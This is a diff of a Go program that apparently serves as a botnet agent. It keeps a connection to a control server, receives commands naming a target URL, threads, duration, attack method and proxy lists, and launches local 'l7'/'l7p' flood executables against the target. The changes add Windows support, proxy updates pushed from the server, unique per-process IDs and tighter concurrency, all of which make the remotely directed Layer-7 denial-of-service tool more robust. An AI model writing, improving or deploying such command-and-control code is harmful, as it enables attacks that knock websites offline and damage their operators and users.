@@ -1,4 +1,3 @@
-// agent.go
 package main
 
 import (
@@ -11,13 +10,15 @@ import (
 	"fmt"
 	"io"
 	"log/slog"
-	"math/rand"
+	"math/rand/v2"
 	"net"
 	"net/http"
 	"net/url"
 	"os"
 	"os/exec"
 	"os/signal"
+	"path/filepath"
+	"runtime"
 	"strconv"
 	"strings"
 	"sync"
@@ -28,11 +29,13 @@ import (
 // ─── Types ────────────────────────────────────────────────────────────────────
 
 type Command struct {
-	Action     string `json:"action"`
-	URL        string `json:"url"`
-	Threads    int    `json:"threads"`
-	Timer      int    `json:"timer"`
-	CustomHost string `json:"custom_host"`
+	Action     string   `json:"action"`
+	URL        string   `json:"url"`
+	Threads    int      `json:"threads"`
+	Timer      int      `json:"timer"`
+	CustomHost string   `json:"custom_host"`
+	Method     string   `json:"method"`
+	Proxies    []string `json:"proxies,omitempty"`
 }
 
 // ─── Agent ────────────────────────────────────────────────────────────────────
@@ -51,8 +54,6 @@ type Agent struct {
 
 	httpClient *http.Client // general-purpose (short timeout)
 	sseClient  *http.Client // long-lived SSE connection (no timeout)
-
-	randSrc *rand.Rand
 }
 
 func NewAgent(controlURL, agentID, token string) *Agent {
@@ -82,7 +83,6 @@ func NewAgent(controlURL, agentID, token string) *Agent {
 			Timeout:   0,
 			Transport: transport(),
 		},
-		randSrc: rand.New(rand.NewSource(time.Now().UnixNano())),
 	}
 }
 
@@ -147,41 +147,54 @@ func (a *Agent) stopCurrent() {
 	a.currCmd = nil
 }
 
-func (a *Agent) executeL7(ctx context.Context, targetURL string, threads, timer int, customHost string) {
+func (a *Agent) executeL7(ctx context.Context, targetURL string, threads, timer int, customHost string, method string) {
 	// Validate URL on the agent side — never trust server input blindly.
 	if err := validateURL(targetURL); err != nil {
 		slog.Error("invalid target URL from server", "err", err)
 		return
 	}
 
-	// Cancel any previously running command before starting a new one.
-	a.stopCurrent()
-
+	// Lock the whole transition to serialize cancellations and startups.
 	a.mu.Lock()
+	a.cancelRun()
+	a.currCmd = nil
 	a.status = "Sending"
-	a.mu.Unlock()
-	a.reportStatus(ctx)
 
 	// Create a child context so we can cancel this run independently.
 	runCtx, cancel := context.WithTimeout(ctx, time.Duration(timer)*time.Second)
-
-	a.mu.Lock()
 	a.cancelRun = cancel
 	a.mu.Unlock()
 
+	a.reportStatus(ctx)
+
 	defer func() {
+
 		cancel() // always release the context
 		a.mu.Lock()
 		a.status = "Ready"
 		a.mu.Unlock()
-		a.reportStatus(ctx)
+		// Use a short-lived background context for the final status report
+		// because the parent ctx may already be cancelled during shutdown.
+		bgCtx, bgCancel := context.WithTimeout(context.Background(), 5*time.Second)
+		defer bgCancel()
+		a.reportStatus(bgCtx)
 	}()
 
 	args := []string{targetURL, strconv.Itoa(threads), strconv.Itoa(timer)}
 	if customHost != "" {
 		args = append(args, customHost)
 	}
-	cmd := exec.CommandContext(runCtx, "./l7", args...)
+
+	executable := "l7"
+	if method == "l7p" {
+		executable = "l7p"
+	}
+	if runtime.GOOS == "windows" {
+		executable += ".exe"
+	}
+	executable = filepath.Join(".", executable)
+
+	cmd := exec.CommandContext(runCtx, executable, args...)
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
 
@@ -266,13 +279,29 @@ func (a *Agent) listenForCommands(ctx context.Context) {
 				case "start":
 					// Run in a goroutine so we don't block the dispatcher,
 					// but stopCurrent() inside executeL7 serialises starts.
-					go a.executeL7(ctx, cmd.URL, cmd.Threads, cmd.Timer, cmd.CustomHost)
+					go a.executeL7(ctx, cmd.URL, cmd.Threads, cmd.Timer, cmd.CustomHost, cmd.Method)
 				case "stop":
 					a.stopCurrent()
 					a.mu.Lock()
 					a.status = "Ready"
 					a.mu.Unlock()
 					a.reportStatus(ctx)
+				case "update_proxies":
+					go func() {
+						file, err := os.Create("proxies.txt")
+						if err != nil {
+							slog.Error("failed to create proxies.txt", "err", err)
+							return
+						}
+						defer file.Close()
+						for _, p := range cmd.Proxies {
+							if _, err := file.WriteString(p + "\n"); err != nil {
+								slog.Error("failed to write proxy", "err", err)
+								return
+							}
+						}
+						slog.Info("updated proxies.txt", "count", len(cmd.Proxies))
+					}()
 				default:
 					slog.Warn("unknown command action", "action", cmd.Action)
 				}
@@ -288,7 +317,7 @@ func (a *Agent) listenForCommands(ctx context.Context) {
 		sseURL := fmt.Sprintf("%s/events?agentID=%s", a.controlURL, a.agentID)
 		req, err := a.newRequest(ctx, http.MethodGet, "/events?agentID="+a.agentID, nil)
 		if err != nil {
-			slog.Error("build SSE request", "err", err, "url", sseURL)
+			slog.Error("build SSE request", "err", err)
 			time.Sleep(backoff)
 			continue
 		}
@@ -296,7 +325,7 @@ func (a *Agent) listenForCommands(ctx context.Context) {
 
 		resp, err := a.sseClient.Do(req)
 		if err != nil {
-			jitter := time.Duration(a.randSrc.Int63n(int64(backoff / 5)))
+			jitter := time.Duration(rand.Int64N(int64(backoff / 5)))
 			slog.Warn("SSE connect error, retrying", "err", err, "backoff", backoff+jitter)
 			time.Sleep(backoff + jitter)
 			backoff = min(backoff*2, 10*time.Second)
@@ -322,8 +351,13 @@ func (a *Agent) listenForCommands(ctx context.Context) {
 
 // ─── Agent ID resolution ──────────────────────────────────────────────────────
 
-// resolveAgentID tries public IP first, then hostname, then "unknown".
+// resolveAgentID builds a unique agent ID in the form "<ip>-<pid>".
+// Using PID as a suffix ensures two agents on the same public IP are
+// always distinct without any operator configuration. Falls back to
+// hostname-pid if the public IP lookup fails.
 func resolveAgentID(client *http.Client) string {
+	pid := strconv.Itoa(os.Getpid())
+
 	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
 	defer cancel()
 
@@ -332,22 +366,25 @@ func resolveAgentID(client *http.Client) string {
 		defer resp.Body.Close()
 		if b, err := io.ReadAll(resp.Body); err == nil {
 			if ip := strings.TrimSpace(string(b)); ip != "" {
-				return ip
+				return ip + "-" + pid
 			}
 		}
 	}
 
 	slog.Warn("could not get public IP, falling back to hostname")
 	if h, err := os.Hostname(); err == nil && h != "" {
-		return h
+		return h + "-" + pid
 	}
-	return "unknown-agent"
+	return "unknown-agent-" + pid
 }
 
 // ─── Main ────────────────────────────────────────────────────────────────────
 
 func main() {
 	serverFlag := flag.String("server", "http://localhost:8081", "control server URL")
+	// -id lets operators assign a stable name (e.g. -id=worker-1) instead of
+	// the auto-generated ip-pid.  Leave empty to use automatic resolution.
+	manualID := flag.String("id", "", "override agent ID (useful when multiple agents share an IP)")
 	flag.Parse()
 
 	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelInfo}))
@@ -363,7 +400,10 @@ func main() {
 
 	// Build a temporary client just for resolving the agent ID.
 	tempClient := &http.Client{Timeout: 10 * time.Second}
-	agentID := resolveAgentID(tempClient)
+	agentID := *manualID
+	if agentID == "" {
+		agentID = resolveAgentID(tempClient)
+	}
 
 	agent := NewAgent(*serverFlag, agentID, token)
 	slog.Info("agent starting", "agentID", agentID, "server", *serverFlag)
@@ -395,12 +435,4 @@ func main() {
 	// Kill any running l7 process gracefully.
 	agent.stopCurrent()
 	slog.Info("stopped")
-}
-
-// min is a helper for Go versions before 1.21 that don't have builtin min.
-func min(a, b time.Duration) time.Duration {
-	if a < b {
-		return a
-	}
-	return b
 }
